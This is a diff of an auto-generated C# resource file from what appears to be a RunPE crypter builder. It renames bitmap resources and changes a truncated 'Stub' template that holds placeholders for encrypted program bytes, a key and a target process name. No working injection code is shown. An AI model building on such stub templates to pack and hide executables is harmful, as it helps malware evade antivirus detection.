@@ -63,9 +63,39 @@ namespace RunPEBuilder.Properties {
         /// <summary>
         ///   Поиск локализованного ресурса типа System.Drawing.Bitmap.
         /// </summary>
-        internal static System.Drawing.Bitmap mainlogo {
+        internal static System.Drawing.Bitmap _1 {
             get {
-                object obj = ResourceManager.GetObject("mainlogo", resourceCulture);
+                object obj = ResourceManager.GetObject("1", resourceCulture);
+                return ((System.Drawing.Bitmap)(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Поиск локализованного ресурса типа System.Drawing.Bitmap.
+        /// </summary>
+        internal static System.Drawing.Bitmap _2 {
+            get {
+                object obj = ResourceManager.GetObject("2", resourceCulture);
+                return ((System.Drawing.Bitmap)(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Поиск локализованного ресурса типа System.Drawing.Bitmap.
+        /// </summary>
+        internal static System.Drawing.Bitmap _3 {
+            get {
+                object obj = ResourceManager.GetObject("3", resourceCulture);
+                return ((System.Drawing.Bitmap)(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Поиск локализованного ресурса типа System.Drawing.Bitmap.
+        /// </summary>
+        internal static System.Drawing.Bitmap _4 {
+            get {
+                object obj = ResourceManager.GetObject("4", resourceCulture);
                 return ((System.Drawing.Bitmap)(obj));
             }
         }
@@ -73,26 +103,26 @@ namespace RunPEBuilder.Properties {
         /// <summary>
         ///   Ищет локализованную строку, похожую на using System;
         ///using System.Diagnostics;
-        ///using System.Windows.Forms;
-        ///using System.Security.Cryptography;
         ///using System.IO;
-        ///using System.Reflection;
-        ///using System.Threading;
         ///using System.Runtime.InteropServices;
+        ///using System.Security.Cryptography;
+        ///using System.Text;
+        ///using System.Windows.Forms;
+        ///using System.Reflection;
+        ///using Microsoft.Win32;
         ///
-        ///namespace stub
+        ///
+        ///namespace DaVinci
         ///{
-        ///    static class Program
+        ///    static class DaVinciAlgorithm
         ///    {
-        ///        private const string program = &quot;%PROGRAM%&quot;;
-        ///        private const string key = &quot;%KEY%&quot;;
-        ///        private const string IV = &quot;%IV%&quot;;
-        ///        private const string GENERIC_ERROR = &quot;Generic error while starting the application.&quot;;
-        ///       [остаток строки не уместился]&quot;;.
+        ///        private static string ApplicationBytes = &quot;%Bytes%&quot;;
+        ///        private static string ApplicationKey = &quot;%Key%&quot;;
+        ///        private static string ApplicationProcess = StringMoar(&quot;%Process%&quot;, ApplicationKey); [остаток строки не уместился]&quot;;.
         /// </summary>
-        internal static string stub {
+        internal static string Stub {
             get {
-                return ResourceManager.GetString("stub", resourceCulture);
+                return ResourceManager.GetString("Stub", resourceCulture);
             }
         }
     }
